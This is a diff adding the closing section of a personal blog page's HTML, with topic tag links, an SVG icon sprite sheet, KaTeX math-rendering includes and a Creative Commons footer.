+        <a href='https://tqts.ar/tags/remix/' class="post_tag button button_translucent" title="remix">
+          REMIX
+          <span class="button_tally">10</span>
+        </a>
+        
+        <a href='https://tqts.ar/tags/solidity/' class="post_tag button button_translucent" title="solidity">
+          SOLIDITY
+          <span class="button_tally">9</span>
+        </a>
+        
+        <a href='https://tqts.ar/tags/python/' class="post_tag button button_translucent" title="python">
+          PYTHON
+          <span class="button_tally">2</span>
+        </a>
+        
+        
+      </nav>
+    </div>
+  </section>
+</aside>
+
+  
+</div>
+    </main><svg width="0" height="0" class="hidden">
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="facebook">
+    <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h151V331h-60v-90h60v-61c0-49.629 40.371-90 90-90h91v90h-91v61h91l-15 90h-76v181h121c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zm0 0"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18.001 18.001" id="twitter">
+    <path d="M15.891 4.013c.808-.496 1.343-1.173 1.605-2.034a8.68 8.68 0 0 1-2.351.861c-.703-.756-1.593-1.14-2.66-1.14-1.043 0-1.924.366-2.643 1.078a3.56 3.56 0 0 0-1.076 2.605c0 .309.039.585.117.819-3.076-.105-5.622-1.381-7.628-3.837-.34.601-.51 1.213-.51 1.846 0 1.301.549 2.332 1.645 3.089-.625-.053-1.176-.211-1.645-.47 0 .929.273 1.705.82 2.388a3.623 3.623 0 0 0 2.115 1.291c-.312.08-.641.118-.979.118-.312 0-.533-.026-.664-.083.23.757.664 1.371 1.291 1.841a3.652 3.652 0 0 0 2.152.743C4.148 14.173 2.625 14.69.902 14.69c-.422 0-.721-.006-.902-.038 1.697 1.102 3.586 1.649 5.676 1.649 2.139 0 4.029-.542 5.674-1.626 1.645-1.078 2.859-2.408 3.639-3.974a10.77 10.77 0 0 0 1.172-4.892v-.468a7.788 7.788 0 0 0 1.84-1.921 8.142 8.142 0 0 1-2.11.593z"
+      ></path>
+  </symbol>
+  <symbol aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="mail">
+    <path  d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="calendar">
+    <path d="M452 40h-24V0h-40v40H124V0H84v40H60C26.916 40 0 66.916 0 100v352c0 33.084 26.916 60 60 60h392c33.084 0 60-26.916 60-60V100c0-33.084-26.916-60-60-60zm20 412c0 11.028-8.972 20-20 20H60c-11.028 0-20-8.972-20-20V188h432v264zm0-304H40v-48c0-11.028 8.972-20 20-20h24v40h40V80h264v40h40V80h24c11.028 0 20 8.972 20 20v48z"></path>
+    <path d="M76 230h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 310h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 390h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80-80h40v40h-40z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="github">
+    <path d="M255.968 5.329C114.624 5.329 0 120.401 0 262.353c0 113.536 73.344 209.856 175.104 243.872 12.8 2.368 17.472-5.568 17.472-12.384 0-6.112-.224-22.272-.352-43.712-71.2 15.52-86.24-34.464-86.24-34.464-11.616-29.696-28.416-37.6-28.416-37.6-23.264-15.936 1.728-15.616 1.728-15.616 25.696 1.824 39.2 26.496 39.2 26.496 22.848 39.264 59.936 27.936 74.528 21.344 2.304-16.608 8.928-27.936 16.256-34.368-56.832-6.496-116.608-28.544-116.608-127.008 0-28.064 9.984-51.008 26.368-68.992-2.656-6.496-11.424-32.64 2.496-68 0 0 21.504-6.912 70.4 26.336 20.416-5.696 42.304-8.544 64.096-8.64 21.728.128 43.648 2.944 64.096 8.672 48.864-33.248 70.336-26.336 70.336-26.336 13.952 35.392 5.184 61.504 2.56 68 16.416 17.984 26.304 40.928 26.304 68.992 0 98.72-59.84 120.448-116.864 126.816 9.184 7.936 17.376 23.616 17.376 47.584 0 34.368-.32 62.08-.32 70.496 0 6.88 4.608 14.88 17.6 12.352C438.72 472.145 512 375.857 512 262.353 512 120.401 397.376 5.329 255.968 5.329z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 212 212" id="gitlab">
+    <path d="M12.3 74.7h54L43.3 3c-1-3.6-6.4-3.6-7.6 0L12.3 74.8z" />
+    <path d="M12.3 74.7L.5 111c-1 3.2 0 6.8 3 8.8l101.6 74-92.5-119z"/>
+    <path d="M105 193.7l-38.6-119h-54l92.7 119z"/>
+    <path d="M105 193.7l38.7-119H66.4l38.7 119z"/>
+    <path d="M105 193.7l38.7-119H198l-93 119z"/>
+    <path d="M198 74.7l11.6 36.2c1 3 0 6.6-3 8.6l-101.5 74 93-119z"/>
+    <path d="M198 74.7h-54.3L167 3c1.2-3.6 6.4-3.6 7.6 0L198 74.8z"/> 
+  </symbol>
+  <symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="rss">
+    <circle cx="3.429" cy="20.571" r="3.429"></circle>
+    <path d="M11.429 24h4.57C15.999 15.179 8.821 8.001 0 8v4.572c6.302.001 11.429 5.126 11.429 11.428z"></path>
+    <path d="M24 24C24 10.766 13.234 0 0 0v4.571c10.714 0 19.43 8.714 19.43 19.429z"></path>
+  </symbol>
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="linkedin">
+    <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h362c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zM181 406h-60V196h60zm0-240h-60v-60h60zm210 240h-60V286c0-16.54-13.46-30-30-30s-30 13.46-30 30v120h-60V196h60v11.309C286.719 202.422 296.93 196 316 196c40.691.043 75 36.547 75 79.688zm0 0"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 612 612" id="arrow">
+    <path d="M604.501 440.509L325.398 134.956c-5.331-5.357-12.423-7.627-19.386-7.27-6.989-.357-14.056 1.913-19.387 7.27L7.499 440.509c-9.999 10.024-9.999 26.298 0 36.323s26.223 10.024 36.222 0l262.293-287.164L568.28 476.832c9.999 10.024 26.222 10.024 36.221 0 9.999-10.023 9.999-26.298 0-36.323z"></path>
+  </symbol>
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="carly">
+    <path d="M504.971 239.029L448 182.059V84c0-46.317-37.682-84-84-84h-44c-13.255 0-24 10.745-24 24s10.745 24 24 24h44c19.851 0 36 16.149 36 36v108c0 6.365 2.529 12.47 7.029 16.971L454.059 256l-47.029 47.029A24.002 24.002 0 0 0 400 320v108c0 19.851-16.149 36-36 36h-44c-13.255 0-24 10.745-24 24s10.745 24 24 24h44c46.318 0 84-37.683 84-84v-98.059l56.971-56.971c9.372-9.372 9.372-24.568 0-33.941zM112 192V84c0-19.851 16.149-36 36-36h44c13.255 0 24-10.745 24-24S205.255 0 192 0h-44c-46.318 0-84 37.683-84 84v98.059l-56.971 56.97c-9.373 9.373-9.373 24.568 0 33.941L64 329.941V428c0 46.317 37.682 84 84 84h44c13.255 0 24-10.745 24-24s-10.745-24-24-24h-44c-19.851 0-36-16.149-36-36V320c0-6.365-2.529-12.47-7.029-16.971L57.941 256l47.029-47.029A24.002 24.002 0 0 0 112 192z"></path>
+  </symbol>
+  <symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="copy">
+    <path d="M23 2.75A2.75 2.75 0 0 0 20.25 0H8.75A2.75 2.75 0 0 0 6 2.75v13.5A2.75 2.75 0 0 0 8.75 19h11.5A2.75 2.75 0 0 0 23 16.25zM18.25 14.5h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5zm0-3h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5zm0-3h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5z"></path>
+    <path d="M8.75 20.5a4.255 4.255 0 0 1-4.25-4.25V2.75c0-.086.02-.166.025-.25H3.75A2.752 2.752 0 0 0 1 5.25v16A2.752 2.752 0 0 0 3.75 24h12a2.752 2.752 0 0 0 2.75-2.75v-.75z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512.001 512.001" id="closeme">
+    <path d="M284.286 256.002L506.143 34.144c7.811-7.811 7.811-20.475 0-28.285-7.811-7.81-20.475-7.811-28.285 0L256 227.717 34.143 5.859c-7.811-7.811-20.475-7.811-28.285 0-7.81 7.811-7.811 20.475 0 28.285l221.857 221.857L5.858 477.859c-7.811 7.811-7.811 20.475 0 28.285a19.938 19.938 0 0 0 14.143 5.857 19.94 19.94 0 0 0 14.143-5.857L256 284.287l221.857 221.857c3.905 3.905 9.024 5.857 14.143 5.857s10.237-1.952 14.143-5.857c7.811-7.811 7.811-20.475 0-28.285L284.286 256.002z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="open-menu">
+    <path d="M492 236H20c-11.046 0-20 8.954-20 20s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20zm0-160H20C8.954 76 0 84.954 0 96s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20zm0 320H20c-11.046 0-20 8.954-20 20s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="instagram">
+    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id=youtube>
+    <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="stackoverflow">
+    <path d="M21 27v-8h3v11H0V19h3v8h18z"></path><path d="M17.1.2L15 1.8l7.9 10.6 2.1-1.6L17.1.2zm3.7 14.7L10.6 6.4l1.7-2 10.2 8.5-1.7 2zM7.2 12.3l12 5.6 1.1-2.4-12-5.6-1.1 2.4zm-1.8 6.8l13.56 1.96.17-2.38-13.26-2.55-.47 2.97zM19 25H5v-3h14v3z"></path>
+  </symbol>
+</svg>
+
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<footer class="footer">
+  <div class="footer_inner wrap pale">
+    <img src='https://tqts.ar/logos/footer.png' class="icon icon_2 transparent" alt="tqts.ar">
+    <p><span class="year"></span> - &nbsp;Written by tqts. All content under Creative Commons  <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">by-nc-sa</a></p><a class="to_top" href="#documentTop">
+  <svg class="icon">
+  <use xlink:href="#arrow"></use>
+</svg>
+</a>
+
+  </div>
+</footer>
+
+    <script type="text/javascript" src="https://tqts.ar/js/bundle.min.061d04727b51b0a8fafe2f15b9370a961f33306e7af52abd00d69c906f5d825f1599306159d7756d7d2b4f359767a170625ae541d1f37d05c1daa4d5c7feec25.js" integrity="sha512-Bh0EcntRsKj6/i8VuTcKlh8zMG569Sq9ANackG9dgl8VmTBhWdd1bX0rTzWXZ6FwYlrlQdHzfQXB2qTVx/7sJQ==" crossorigin="anonymous"></script>
+    
+  </body>
+</html>
